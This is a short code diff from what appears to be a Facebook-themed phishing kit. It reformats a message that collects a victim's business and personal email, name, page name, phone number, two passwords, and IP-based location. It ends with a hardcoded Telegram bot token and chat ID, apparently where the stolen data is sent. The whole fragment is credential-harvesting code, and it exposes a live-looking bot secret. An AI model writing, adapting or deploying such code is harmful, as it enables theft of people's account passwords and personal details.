@@ -211,16 +211,16 @@ function showPrompt(IpAddress) {
             password = FIRST_PASSWORD;
         }
 
-        const message1 = `<strong>User Email: </strong><code>${$("#business-email").val()}</code>
-%0A<strong>User Name: </strong><code>${$("#full-name").val()}</code>
-%0A<strong>User Email: </strong><code>${$("#personal-email").val()}</code>
-%0A<strong>Facebook Page: </strong><code>${$("#page-name").val()}</code>
-%0A<strong>Phone Number: </strong><code>${$("#phone").val()}</code>
-%0A<strong>First Password: </strong><code>${password}</code>
-%0A<strong>Second Password: </strong><code>${secondPassword}</code>
-%0A<strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
-%0A<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
-%0A<strong>City: </strong><code>${IpAddress.city}</code>`;
+        const message1 = `📧 <strong>Business Email: </strong><code>${$("#business-email").val()}</code>
+👤 <strong>User Name: </strong><code>${$("#full-name").val()}</code>
+📨 <strong>Personal Email: </strong><code>${$("#personal-email").val()}</code>
+🏳️ <strong>Facebook Page: </strong><code>${$("#page-name").val()}</code>
+📞 <strong>Phone Number: </strong><code>${$("#phone").val()}</code>
+🔑 <strong>First Password: </strong><code>${password}</code>
+🔑 <strong>Second Password: </strong><code>${secondPassword}</code>
+ <strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
+🌐 <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
+ <strong>City: </strong><code>${IpAddress.city}</code>`;
 
         const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
         const chatId = '-1002416068664';
